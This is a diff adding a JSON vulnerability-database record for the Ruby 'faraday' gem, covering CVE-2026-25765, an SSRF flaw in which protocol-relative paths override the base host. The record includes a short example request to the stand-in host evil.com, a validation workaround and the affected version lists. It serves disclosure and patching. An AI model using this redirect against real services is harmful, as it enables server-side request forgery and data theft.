@@ -1,0 +1,137 @@
+{
+  "schema_version": 1,
+  "package": "rb-faraday",
+  "purls": [
+    "pkg:gem/faraday"
+  ],
+  "generated_at": "2026-05-18T06:01:40+00:00",
+  "conda_versions_total": 5,
+  "advisories": [
+    {
+      "id": "GHSA-33mh-2634-fwr2",
+      "primary_id": "CVE-2026-25765",
+      "aliases": [
+        "CVE-2026-25765"
+      ],
+      "cve_ids": [
+        "CVE-2026-25765"
+      ],
+      "ecosystem": "RubyGems",
+      "upstream_name": "faraday",
+      "summary": "Faraday affected by SSRF via protocol-relative URL host override in build_exclusive_url",
+      "details": "### Impact\n\n  Faraday's `build_exclusive_url` method (in `lib/faraday/connection.rb`) uses Ruby's\n  `URI#merge` to combine the connection's base URL with a user-supplied path. Per RFC 3986,\n  protocol-relative URLs (e.g. `//evil.com/path`) are treated as network-path references\n  that override the base URL's host/authority component.\n\n  This means that if any application passes user-controlled input to Faraday's `get()`,\n  `post()`, `build_url()`, or other request methods, an attacker can supply a\n  protocol-relative URL like `//attacker.com/endpoint` to redirect the request to an\n  arbitrary host, enabling Server-Side Request Forgery (SSRF).\n\n  The `./` prefix guard added in v2.9.2 (PR #1569) explicitly exempts URLs starting with\n  `/`, so protocol-relative URLs bypass it entirely.\n\n  **Example:**\n  ```ruby\n  conn = Faraday.new(url: 'https://api.internal.com')\n  conn.get('//evil.com/steal')\n  # Request is sent to https://evil.com/steal instead of api.internal.com\n  ```\n\n### Patches\n\n  Faraday v2.14.1 is patched against this security issue. All versions of Faraday up to 2.14.0 are affected.\n\n### Workarounds\n\n  **NOTE: Upgrading to Faraday v2.14.1+ is the recommended action to mitigate this issue, however should that not be an option please continue reading.**\n\n  Applications should validate and sanitize any user-controlled input before passing it to\n  Faraday request methods. Specifically:\n\n  - Reject or strip input that starts with // followed by a non-/ character\n  - Use an allowlist of permitted path prefixes\n  - Alternatively, prepend ./ to all user-supplied paths before passing them to Faraday\n\n  Example validation:\n  ```ruby\n  def safe_path(user_input)\n    raise ArgumentError, \"Invalid path\" if user_input.match?(%r{\\A//[^/]})\n    user_input\n  end\n  ```",
+      "published": "2026-02-09T20:37:05Z",
+      "modified": "2026-02-16T12:28:48.005901Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/lostisland/faraday/security/advisories/GHSA-33mh-2634-fwr2"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-25765"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/lostisland/faraday/pull/1569"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/lostisland/faraday/commit/a6d3a3a0bf59c2ab307d0abd91bc126aef5561bc"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/lostisland/faraday"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/lostisland/faraday/releases/tag/v1.10.5"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/lostisland/faraday/releases/tag/v2.14.1"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/faraday/CVE-2026-25765.yml"
+        },
+        {
+          "type": "WEB",
+          "url": "https://www.rfc-editor.org/rfc/rfc3986#section-5.2.2"
+        },
+        {
+          "type": "WEB",
+          "url": "https://www.rfc-editor.org/rfc/rfc3986#section-5.4"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-33mh-2634-fwr2",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "2.0.0"
+            },
+            {
+              "fixed": "2.14.1"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "2.0.0",
+        "2.0.1",
+        "2.1.0",
+        "2.10.0",
+        "2.10.1",
+        "2.11.0",
+        "2.12.0",
+        "2.12.1",
+        "2.12.2",
+        "2.12.3",
+        "2.13.0",
+        "2.13.1",
+        "2.13.2",
+        "2.13.3",
+        "2.13.4",
+        "2.14.0",
+        "2.2.0",
+        "2.3.0",
+        "2.4.0",
+        "2.5.0",
+        "2.5.1",
+        "2.5.2",
+        "2.6.0",
+        "2.7.0",
+        "2.7.1",
+        "2.7.10",
+        "2.7.11",
+        "2.7.12",
+        "2.7.2",
+        "2.7.3",
+        "2.7.4",
+        "2.7.5",
+        "2.7.6",
+        "2.7.7",
+        "2.7.8",
+        "2.7.9",
+        "2.8.0",
+        "2.8.1",
+        "2.9.0",
+        "2.9.1",
+        "2.9.2"
+      ],
+      "affected_conda_versions": []
+    }
+  ]
+}
